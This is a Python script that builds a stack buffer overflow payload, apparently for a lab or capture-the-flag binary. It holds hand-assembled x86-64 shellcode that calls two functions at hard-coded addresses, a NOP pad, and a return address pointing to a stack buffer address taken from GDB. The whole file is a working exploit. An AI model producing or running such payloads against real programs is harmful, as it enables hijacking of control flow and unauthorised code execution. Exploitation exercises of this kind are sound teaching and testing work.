#!/usr/bin/env python3
import sys
import struct

# Machine code generated by GNU assembler
shellcode = bytes.fromhex(
    "48 83 ec 40 "
    "6a 04 "
    "5f "
    "b8 87 1a 40 00 "
    "ff d0 "
    "31 ff "
    "b8 80 18 40 00 "
    "ff d0"
)

# The stack buffer address obtained from GDB
buffer_addr = 0x721000800fd0

# Shellcode occupies 23 bytes.
# Fill the remaining byte before the return address.
padding = b"\x90"

# Construct the payload
payload = shellcode + padding + struct.pack("<Q", buffer_addr)

assert len(shellcode) == 23
assert len(payload) == 32
assert b"\x0a" not in payload

sys.stdout.buffer.write(payload + b"\n")

